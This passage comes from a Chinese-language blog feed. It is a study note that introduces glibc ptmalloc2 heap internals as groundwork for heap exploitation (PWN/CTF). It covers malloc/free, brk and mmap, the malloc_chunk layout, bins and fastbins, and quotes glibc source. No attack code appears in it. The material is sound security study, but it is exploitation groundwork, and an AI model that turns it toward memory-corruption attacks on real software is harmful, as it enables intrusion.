__int_malloc_source&#x2F;)</li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Heap Exploitation-基础知识</title>
      <link href="/article/2809.html"/>
      <url>/article/2809.html</url>
      
        <content type="html"><![CDATA[<h1 id="Heap-Exploitation-基础知识"><a href="#Heap-Exploitation-基础知识" class="headerlink" title="Heap Exploitation - 基础知识"></a>Heap Exploitation - 基础知识</h1><h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>程序运行过程中，堆可以提供动态分配的内存，允许程序申请大小未定的内存。堆其实就是程序虚拟空间的一块连续的线性区域，它由低地址向高地址生长，并称管理堆的程序为：堆管理器</p><p>堆管理器位于程序与内核之间，主要进行以下的工作：</p><ol><li>响应用户的申请内存请求，向操作系统申请内存，并将其返回给用户程序。为了保持用户程序的高效性，内核一般都会分配一块很大的连续内存，让堆管理器通过某种算法对其进行管理。只有当堆空间不足时，才会与操作系统进行再次交互</li><li>管理用户释放的内存，用户释放的内存并不是直接返回给操作系统，而是由堆管理器进行管理，这样释放的内存可以来响应用户新申请的内存的请求</li></ol><p>目前Linux标准发行版中使用的堆分配器是glibc中的堆分配器：ptmalloc2。ptmalloc2主要是通过malloc&#x2F;free来分配和释放内存块。</p><h2 id="堆和栈"><a href="#堆和栈" class="headerlink" title="堆和栈"></a>堆和栈</h2><h3 id="堆-1"><a href="#堆-1" class="headerlink" title="堆"></a>堆</h3><ul><li><p>程序员分配释放，程序员不释放就操作系统回收，分配方式类似于链表。程序自己申请，比如<code>malloc</code>和<code>new</code>这样的。</p></li><li><p>操作系统有个记录空闲地址的链表，申请后就遍历这个链表，找空间大于申请空间的堆结点，找到第一个就把这个节点从那个空闲链表删除，把这一段空闲空间分配给程序。一般来说找到的不一定正好等于申请的大小，多余的就被系统放进空闲链表中。</p></li><li><p>堆向高地址伸展，就和上面说的一样，因为是空闲链表，所以是不连续的。</p></li><li><p>堆是程序员申请的，速度比较慢，容易产生内存碎片。</p></li></ul><h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><ul><li>栈的话是编译器自动分配释放，存放函数的参数值、局部变量等，操作方式就和数据结构的栈类似，先进后出这样。比如函数中声明一个局部变量<code>int b</code>，那系统就给b开辟空间。</li><li>栈空间大于申请空间就可以。</li><li>栈由高地址向低地址伸展，是连续的内存区域。</li><li>栈是系统分配，速度比较快。</li></ul><h2 id="ptmalloc"><a href="#ptmalloc" class="headerlink" title="ptmalloc"></a>ptmalloc</h2><h3 id="分配器"><a href="#分配器" class="headerlink" title="分配器"></a>分配器</h3><p>分配器处于内核和用户程序之间。分配器的主要作用：应用户的分配请求，向操作系统申请内存，然后将内存返回给用户程序。为了保证高效，分配器一般都会预先分配一块大于用户请求的内存，然后管理这块内存。用户释放掉的内存也不是立即返回给操作系统的，分配器会管理这些释放掉的空闲空间以应对用户以后的内存分配请求。分配器不仅需要管理分配的内存块，还需要管理空间的内存块。当响应用户的请求时，分配器会首先在空闲空间中寻找一块合适的内存返回给用户，在空闲空间中找不到的情况下才会重新分配一块新的内存。</p><h3 id="ptmalloc实现"><a href="#ptmalloc实现" class="headerlink" title="ptmalloc实现"></a>ptmalloc实现</h3><ul><li>长生命周期的大内存分配使用mmap</li><li>短生命周期的内存分配使用sbrk</li><li>尽量只缓存临时使用的空闲小内存块，大内存块或者是生命周期较长的大内存块释放时直接归还给操作系统</li><li>长期存储的程序不合适用ptmalloc管理</li><li>空闲的小内存块只会在malloc和free的时候进行合并。</li></ul><h2 id="堆的基本操作"><a href="#堆的基本操作" class="headerlink" title="堆的基本操作"></a>堆的基本操作</h2><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p>在glibc的malloc.c中对malloc的说明如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">  malloc(size_t n)</span><br><span class="line">  Returns a pointer to a newly allocated chunk of at least n bytes, or null</span><br><span class="line">  if no space is available. Additionally, on failure, errno is</span><br><span class="line">  set to ENOMEM on ANSI C systems.</span><br><span class="line">  If n is zero, malloc returns a minumum-sized chunk. (The minimum</span><br><span class="line">  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit</span><br><span class="line">  systems.)  On most systems, size_t is an unsigned type, so calls</span><br><span class="line">  with negative arguments are interpreted as requests for huge amounts</span><br><span class="line">  of space, which will often fail. The maximum supported value of n</span><br><span class="line">  differs across systems, but is in all cases less than the maximum</span><br><span class="line">  representable value of a size_t.</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>翻译一下就是，malloc函数返回对应大小字节的指针。一些异常情况下，当n&#x3D;0时，返回当前系统允许的堆的最小内存块；当n为负数时，由于在大多数系统上，size_t是无符号整数，所以程序就会申请很大的内存空间，而由于一般来说系统没有那么多的内存能分配，所以通常会失败。</p><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p>在 glibc 的 malloc.c中对free 的说明如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">      free(void* p)</span><br><span class="line">      Releases the chunk of memory pointed to by p, that had been previously</span><br><span class="line">      allocated using malloc or a related routine such as realloc.</span><br><span class="line">      It has no effect if p is null. It can have arbitrary (i.e., bad!)</span><br><span class="line">      effects if p has already been freed.</span><br><span class="line">      Unless disabled (using mallopt), freeing very large spaces will</span><br><span class="line">      when possible, automatically trigger operations that give</span><br><span class="line">      back unused memory to the system, thus reducing program footprint.</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>就是说free函数会释放p所指向的内存块，这个内存块有可能是通过malloc或者realloc得到的。一些异常情况下，p如果是空指针不执行任何操作；但如果p已经被释放了，再次释放会出现一些不明觉厉的效果，就是<code>double free</code>；除了被禁用（mallopt）的情况下，当释放很大的内存空间时，程序会将这些内存空间还给系统以便减少程序使用的内存空间。</p><h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>malloc和free函数实际上是我们申请和释放内存的会使用到的，这些函数背后的系统调用主要是 <a href="http://man7.org/linux/man-pages/man2/sbrk.2.html">(s)brk</a> 函数以及 <a href="http://man7.org/linux/man-pages/man2/mmap.2.html">mmap, munmap</a> 函数，它们来与系统进行交互，如下图所示</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222322353.png"></p><h4 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h4><p>对于堆的操作，操作系统提供了brk函数，glibc库提供了sbrk函数，可以通过增加brk的大小来向操作系统申请内存。</p><p>在堆未初始化时，program_break指向bss段的末尾，通过调用brk()和sbrk()来移动program_break使得堆增长。</p><p>在堆初始化时，堆的起始地址 <a href="http://elixir.free-electrons.com/linux/v3.8/source/include/linux/mm_types.h#L365">start_brk</a> 以及堆的当前末尾 <a href="http://elixir.free-electrons.com/linux/v3.8/source/include/linux/mm_types.h#L365">brk</a> 指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同</p><ul><li>不开启 ASLR 保护时，start_brk 以及 brk 会指向 data&#x2F;bss 段的结尾。</li><li>开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data&#x2F;bss 段结尾后的随机偏移处。</li></ul><p>函数定义</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">brk</span><span class="params">(<span class="type">void</span>* end_data_segment)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">sbrk</span><span class="params">(<span class="type">intptr_t</span> increment)</span></span><br></pre></td></tr></table></figure><p>brk()的参数是一个指针，用于设置program_break指向的位置。sbrk()的参数increment（可以是负值）用来和program-break相加调整program_break的值。</p><h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4><p>malloc 会使用 <a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=3.8#L1285">mmap</a> 来创建独立的匿名映射段。匿名映射的目的主要是可以申请以 0 填充的内存，并且这块内存仅被调用进程所使用。<strong>通过unmmap()回收。</strong></p><h3 id="多线程支持"><a href="#多线程支持" class="headerlink" title="多线程支持"></a>多线程支持</h3><p>在原来的dlmalloc实现中，因为所有线程共享一个堆，所以当两个线程要申请内存时，只有一个线程可以进入临界区申请内存，另一个线程则必须等待到临界区中不再有线程才能申请。在glibc的ptmalloc实现中，支持了多线程的快速访问，所有线程共享多个堆。</p><h2 id="堆的结构"><a href="#堆的结构" class="headerlink" title="堆的结构"></a>堆的结构</h2><p>主要分为：</p><p>宏观结构：</p><ul><li>包含堆的宏观信息，可以通过这些数据结构索引堆的基本信息</li><li>主要是堆块之间的链接</li></ul><p>微观结构</p><ul><li>用于处理堆分配与回收的内存块</li><li>主要还是怎么处理堆的分配与回收中的内存块</li><li>malloc、free</li></ul><h3 id="微观结构"><a href="#微观结构" class="headerlink" title="微观结构"></a>微观结构</h3><p>堆的利用与这些结构密切相关</p><h4 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h4><p>chunk是glibc管理内存的基本单位，整个堆会在初始化后被当作是一个free chunk，称为top chunk。</p><h5 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h5><p>在程序执行的过程中，称由malloc申请的内存为chunk，这块内存在ptmalloc内部用malloc chunk保存，当chunk被free后，会被加入相应的空闲管理列表。</p><p>无论chunk的大小如何，处于分配状态还是释放状态，都使用同一个统一的结构。</p><p>结构如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>一个chunk可分为两个部分，一个部分暂且可以被称作是<strong>chunk head</strong>，用来保存chunk信息，方便后续对chunk进行分配与释放。这部分包含prev_size和size，大小为size_t，在32位程序中size_t为32位无符号整数，在64位程序中为64位无符号整数。所以堆中实际分配的内存会比用户申请的大两倍size_t。另一部分由chunk所处的状态决定，一般称为<strong>user data</strong>。如果是已分配的chunk，会被用来存储数据，如果是被释放的空闲chunk，则包含fd、bk、fd_nextsize、bk_nextsize，并保存bin中链表的指针，大小为size_t字节。</p><p><strong>默认情况下INTFRNAL_SIZE_T的大小在64位系统下是8字节，32位系统下是4字节。</strong></p><p>对每个字段的解释：</p><ul><li><p>prev_size：如果该chunk的物理相邻前一地址chunk（两个指针的地址差值为一个chunk）是空闲的话，那么该字段记录的是前一个chunk的大小（包括chunk头），否则就用来存储物理相邻的前一个chunk的数据。<strong>这里的chunk指的是较低地址的chunk。</strong></p></li><li><p>size：chunk的大小必须是2 * SIZE_SZ的整数倍，如果申请的内存大小不是2 * SIZE_SZ的整数倍，会被转换为满足2 * SIZE_SZ的倍数，32位系统中，SIZE_SZ是4；64位系统中，SIZE_SZ是8。简单来说就是size记录当前chunk的大小，在32位程序中是8字节对齐的，64位程序中则是16字节对齐。该字段的低三位不影响chunk，从高到低分别表示</p><ul><li>NON_MAIN_ARENA（A位）：记录当前chunk是否不属于主线程，不属于为1，属于为0</li><li>IS_MAPPED（M位）：记录当前chunk是否是由mmap分配的</li><li>PREV_INUSE（P位）：记录前一个chunk是否被分配。一般来说，堆中第一个被分配的内存块的size字段的P位都会被设置为1，以便于防止前面的非法内存。为0时表示被释放，可以通过prev_size获取上一个chunk的大小和地址，方便进行空闲chunk的合并。</li></ul></li><li><p>fd，bk：chunk处于分配状态时，从fd开始是用户的数据，chunk空闲时，会被添加到对应的空闲管理链表中，<strong>仅在当前chunk处于释放状态时有效</strong>。字段含义如下：</p><ul><li>fd指向下一个（非物理相邻）空闲的chunk</li><li>bk指向上一个（非物理相邻）空闲的chunk</li><li>通过fd和bk可以将空闲的chunk加入到空闲的chunk块链表进行统一管理</li></ul></li><li><p>fd_nextsize，bk_nextsize：<strong>与fd和bk相似，仅在处于释放状态时有效’否则就是用户使用的空间，不同的是它们仅用于large bins</strong></p><ul><li>fd_nextsize指向前一个与当前chunk大小不同的第一个空闲块，不包含bin的头指针</li><li>bk_nextsize指向后一个与当前chunk大小不同的第一个空闲块，不包含bin的头指针</li><li>一般情况下，large chunk在fd的遍历中，按从大到小的顺序排列，避免挨个遍历</li></ul></li></ul><p>一个被分配的chunk结构如下，<strong>申请的chunk经malloc()函数返回给用户的内存指针实际上是指向user data的mem指针，指向user data的起始处</strong>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             (size of chunk, but used for application data)    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222321301.png" alt="image-20231127212844219"></p><p>当一个chunk被分配后，实际上它的下一个chunk的prev_size是无效的，那么下一个chunk的prev_size就可以被当前的chunk使用，<strong>这就是chunk的空间复用。</strong></p><p>被释放的chunk被记录在链表中，结构如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`head:&#x27; |             Size of chunk, in bytes                     |A|0|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Forward pointer to next chunk in list             |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Back pointer to previous chunk in list            |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Unused space (may be 0 bytes long)                .</span><br><span class="line">        .                                                               .</span><br><span class="line"> next   .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`foot:&#x27; |             Size of chunk, in bytes                           |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|0|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222321325.png" alt="image-20231127212852601"></p><p>一般来说，物理相邻的两个空闲chunk会被合并为一个chunk，堆管理器会通过prev_size和size将两个物理相邻的空闲chunk块合并。</p><p><strong>malloc chunk是如何节省内存的</strong></p><ul><li>prev_size在上一个chunk为释放状态时才有效，否则会加入上一个chunk的user data部分。节省一个SIZE_SZ大小的内存</li><li>size最后三位被用来标记chunk的状态</li><li>fd和bk指针仅在释放状态下有效，节省了SIZE_SZ * 2 大小的内存</li><li>fd_nextsize和bk_nextsize仅在large bins中有效</li></ul><h5 id="chunk堆相关的宏"><a href="#chunk堆相关的宏" class="headerlink" title="chunk堆相关的宏"></a>chunk堆相关的宏</h5><p>主要涉及到一些chunk大小、对齐、转换的宏。</p><p><del>太多了，用到再说。。。。。。</del></p><h4 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h4><p>用户释放掉的chunk不会直接归还给系统，而是由ptmalloc统一管理heap和mmap映射区域中空闲的chunk，当用户再一次申请分配内存时，ptmalloc分配器就会在空闲的chunk中找一块合适的给用户，这样可以避免频繁的进行系统调用，降低内存分配的开销。</p><p>bin是一种链表结构，用于管理被释放的空闲chunk，当用户释放chunk后，会根据chunk的大小以及使用状态将其存储在不同的bin中。用户再申请内存时，系统会检索bin来分配合适的chunk给用户。bin分为四类：fastbin、small bin、large bin、unsorted bin，在glibc2.26以后 ，还加入了tcache。</p><p>ptmalloc将small bin、large bin、unsorted bin维护在同一个数组中，这些bin对应的数据结构在malloc_state中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS 128</span></span><br><span class="line"><span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];</span><br></pre></td></tr></table></figure><p>bins主要用于索引不同的bin的fd和dk</p><p>为了简化使用，每个bin的header都是malloc_chunk类型。为了节省空间和提高局限性，只分配bin的fd&#x2F;bk指针，然后使用repositioning tricks将这些指针视为一个malloc_chunk*字段。</p><p>32位系统中，bins的前4项含义如下：</p><ul><li>bin[0]：bin1的fb&#x2F;bin2的prev_size</li><li>bin[1]：bin1的bk&#x2F;bin2的size</li><li>bin[2]：bin2的fd&#x2F;bin3的prev_size</li><li>bin[3]：bin2的bk&#x2F;bin3的size</li></ul><p>bin2的prev_size、size和bin1的fd、bk重合，由于一般使用fd、bk来索引链表，所以实际上后一个bin和前一个bin虽然共用部分数据，但是记录的就是前一个bin的链表数据。</p><p>数组中的bin依次如下：</p><ul><li>第一个为unsorted bin，没有进行排序，比较杂</li><li>索引从2到63的bin为small bin，同一个small bin链表中的chunk的大小相同。两个相邻索引的small bin链表中chunk相差的字节数在32位为8字节，64位中为16字节。</li><li>small bins后面的bin被称作是large bins。large bins中的每一个bin都包含一定范围内的chunk，其中的chunk按fd指针的顺序从大到小排列，相同大小的chunk按照最近使用顺序排列。</li></ul><p>并且，<strong>任意两个物理相邻的空闲chunk不能在一起</strong></p><p>ptmalloc为了提高分配的速度，会把一些小的chunk先放到fast bins的容器内，并且fast bin容器中的chunk使用标记总是被置位的</p><p><del>bin中的宏：用到再说。。。。。。</del></p><h5 id="Fast-Bin"><a href="#Fast-Bin" class="headerlink" title="Fast Bin"></a>Fast Bin</h5><p>程序会经常申请或释放一些比较小的内存块，如果将较小的chunk释放后与相邻空闲的chunk合并，那么下次申请较小的chunk时又要分割，为了防止这种情况的发生，就有了Fast bin。对应变量就是malloc state中的fastbinsY</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Fastbins</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    An array of lists holding recently freed small chunks.  Fastbins</span></span><br><span class="line"><span class="comment">    are not doubly linked.  It is faster to single-link them, and</span></span><br><span class="line"><span class="comment">    since chunks are never removed from the middles of these lists,</span></span><br><span class="line"><span class="comment">    double linking is not necessary. Also, unlike regular bins, they</span></span><br><span class="line"><span class="comment">    are not even processed in FIFO order (they use faster LIFO) since</span></span><br><span class="line"><span class="comment">    ordering doesn&#x27;t much matter in the transient contexts in which</span></span><br><span class="line"><span class="comment">    fastbins are normally used.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Chunks in fastbins keep their inuse bit set, so they cannot</span></span><br><span class="line"><span class="comment">    be consolidated with other free chunks. malloc_consolidate</span></span><br><span class="line"><span class="comment">    releases all chunks in fastbins and consolidates them with</span></span><br><span class="line"><span class="comment">    other free chunks.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mfastbinptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    This is in malloc_state.</span></span><br><span class="line"><span class="comment">    /* Fastbins */</span></span><br><span class="line">    mfastbinptr fastbinsY[ NFASTBINS ];</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p><strong>glibc采用单向链表堆每个bin进行组织，并且每个bin采用LIFO的方式，最近释放的chunk会被更早的分配。</strong>也就是说，如果申请的chunk小于fastbin的最大大小时，ptmalloc就会先判断fastbin中是否有大小合适的空闲块。有就会直接用，没有就会进行别的操作。</p><p>同一大小的 chunk 会在同一条链上，不同大小的 chunk 在不同的链上</p><p>不同平台大小不同，列一个索引，当 malloc 的大小在这个范围内的时候会首先去 fast bin 中找</p><table><thead><tr><th align="center">fastbinsY[]</th><th align="center">x86（size_t&#x3D;4）</th><th align="center">x64（size_t&#x3D;8）</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">0x10</td><td align="center">0x20</td></tr><tr><td align="center">1</td><td align="center">0x18</td><td align="center">0x30</td></tr><tr><td align="center">2</td><td align="center">0x20</td><td align="center">0x40</td></tr><tr><td align="center">3</td><td align="center">0x28</td><td align="center">0x50</td></tr><tr><td align="center">4</td><td align="center">0x30</td><td align="center">0x60</td></tr><tr><td align="center">5</td><td align="center">0x38</td><td align="center">0x70</td></tr><tr><td align="center">6</td><td align="center">0x40</td><td align="center">0x80</td></tr></tbody></table><p>32位系统中，一般fast bin默认支持的最大chunk的大小是64字节，但是支持的chunk的数据空间大小为80字节，最多支持10个bin。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NFASTBINS (fastbin_index(request2size(MAX_FAST_SIZE)) + 1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DEFAULT_MXFAST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_MXFAST (64 * SIZE_SZ / 4)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The maximum fastbin request size we support */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_FAST_SIZE (80 * SIZE_SZ / 4)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Since the lowest 2 bits in max_fast don&#x27;t matter in size comparisons,</span></span><br><span class="line"><span class="comment">   they are used as flags.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   FASTCHUNKS_BIT held in max_fast indicates that there are probably</span></span><br><span class="line"><span class="comment">   some fastbin chunks. It is set true on entering a chunk into any</span></span><br><span class="line"><span class="comment">   fastbin, and cleared only in malloc_consolidate.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The truth value is inverted so that have_fastchunks will be true</span></span><br><span class="line"><span class="comment">   upon startup (since statics are zero-filled), simplifying</span></span><br><span class="line"><span class="comment">   initialization checks.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//判断分配区是否有 fast bin chunk，1表示没有</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FASTCHUNKS_BIT (1U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> have_fastchunks(M) (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> clear_fastchunks(M) catomic_or(&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_fastchunks(M) catomic_and(&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous</span></span><br><span class="line"><span class="comment">   regions.  Otherwise, contiguity is exploited in merging together,</span></span><br><span class="line"><span class="comment">   when possible, results from consecutive MORECORE calls.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The initial value comes from MORECORE_CONTIGUOUS, but is</span></span><br><span class="line"><span class="comment">   changed dynamically if mmap is ever used as an sbrk substitute.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// MORECORE是否返回连续的内存区域。</span></span><br><span class="line"><span class="comment">// 主分配区中的MORECORE其实为sbr()，默认返回连续虚拟地址空间</span></span><br><span class="line"><span class="comment">// 非主分配区使用mmap()分配大块虚拟内存，然后进行切分来模拟主分配区的行为</span></span><br><span class="line"><span class="comment">// 而默认情况下mmap映射区域是不保证虚拟地址空间连续的，所以非主分配区默认分配非连续虚拟地址空间。</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NONCONTIGUOUS_BIT (2U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> contiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> noncontiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) != 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_noncontiguous(M) ((M)-&gt;flags |= NONCONTIGUOUS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_contiguous(M) ((M)-&gt;flags &amp;= ~NONCONTIGUOUS_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the</span></span><br><span class="line"><span class="comment">   arena.  Such an arena is no longer used to allocate chunks.  Chunks</span></span><br><span class="line"><span class="comment">   allocated in that arena before detecting corruption are not freed.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARENA_CORRUPTION_BIT (4U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_is_corrupt(A) (((A)-&gt;flags &amp; ARENA_CORRUPTION_BIT))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_arena_corrupt(A) ((A)-&gt;flags |= ARENA_CORRUPTION_BIT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Set value of max_fast.</span></span><br><span class="line"><span class="comment">   Use impossibly small value if 0.</span></span><br><span class="line"><span class="comment">   Precondition: there are no existing fastbin chunks.</span></span><br><span class="line"><span class="comment">   Setting the value clears fastchunk bit but preserves noncontiguous bit.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_max_fast(s)                                                        \</span></span><br><span class="line"><span class="meta">    global_max_fast =                                                          \</span></span><br><span class="line"><span class="meta">        (((s) == 0) ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> get_max_fast() global_max_fast</span></span><br></pre></td></tr></table></figure><p>ptmalloc 默认情况下会调用 set_max_fast(s) 将全局变量 global_max_fast 设置为 DEFAULT_MXFAST，也就是设置 fast bins 中 chunk 的最大值。当 MAX_FAST_SIZE 被设置为 0 时，系统就不会支持 fastbin 。</p><p><strong>fastbin 范围的 chunk 的 inuse 始终被置为 1。因此它们不会和其它被释放的 chunk 合并。</strong></p><p>当释放的 chunk 与该 